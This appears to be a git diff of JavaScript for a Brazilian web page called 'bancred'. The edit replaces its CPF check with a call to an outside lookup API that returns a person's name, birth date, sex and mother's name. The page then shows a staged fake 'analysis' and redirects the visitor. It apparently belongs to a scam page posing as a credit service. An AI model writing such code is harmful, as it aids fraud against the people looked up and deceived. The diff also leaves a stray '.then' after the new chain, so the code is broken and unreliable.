@@ -353,14 +353,65 @@
             return;
         }
 
-        fetch("https://com-bancred.vercel.app/consulta/cpf", {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
-            },
-            body: JSON.stringify({ cpf: cpf })
-        })
+        fetch(`https://api.arkz.tech/api/cpf/eda7dd28b39f2480fdf204e5a440cdbd8a250528cbf56769d6503a6ee7d8cff8/${cpf.replace(/\D/g, '')}`)
+.then(res => res.json())
+.then(resposta => {
+
+    // ADAPTAÇÃO MÍNIMA PARA NÃO QUEBRAR A LÓGICA ATUAL
+    if (resposta && resposta.nome) {
+        resposta = {
+            success: true,
+            data: {
+                CPF: cpf,
+                NOME: resposta.nome || '',
+                NASC: resposta.nascimento || '',
+                SEXO: resposta.sexo || '',
+                NOME_MAE: resposta.mae || ''
+            }
+        };
+    }
+
+    // DAQUI PRA BAIXO É 100% SEU CÓDIGO ORIGINAL
+    if (resposta.success) {
+        sessionStorage.setItem("userData", JSON.stringify(resposta.data));
+
+        $('.consulta').addClass('hidden');
+        $('.analise').removeClass('hidden');
+
+        $('#analise').html(step1);
+        setTimeout(() => {
+            $('#analise').html(step2);
+            setTimeout(() => {
+                $('#analise').html(step3);
+                setTimeout(() => {
+                    window.location.href = "https://com-bancred.vercel.app/pessoa/";
+                }, 600);
+            }, 3000);
+        }, 3000);
+    } else {
+        throw new Error("CPF não encontrado");
+    }
+})
+.catch(() => {
+    $('#cpf').addClass('border-red-500');
+    $('p[data-testid="error-message"]')
+        .removeClass('hidden')
+        .addClass('flex')
+        .html(`
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round"
+                class="lucide lucide-circle-alert mt-0.5 h-4 w-4 flex-shrink-0">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" x2="12" y1="8" y2="12"></line>
+                <line x1="12" x2="12.01" y1="16" y2="16"></line>
+            </svg>
+            <span>Ocorreu um erro ao consultar o CPF. Tente mais tarde!</span>
+        `);
+
+    $('button[type="submit"]').text('Continuar');
+});
+
         .then(res => res.json())
         .then(resposta => {
             if (resposta.success) {
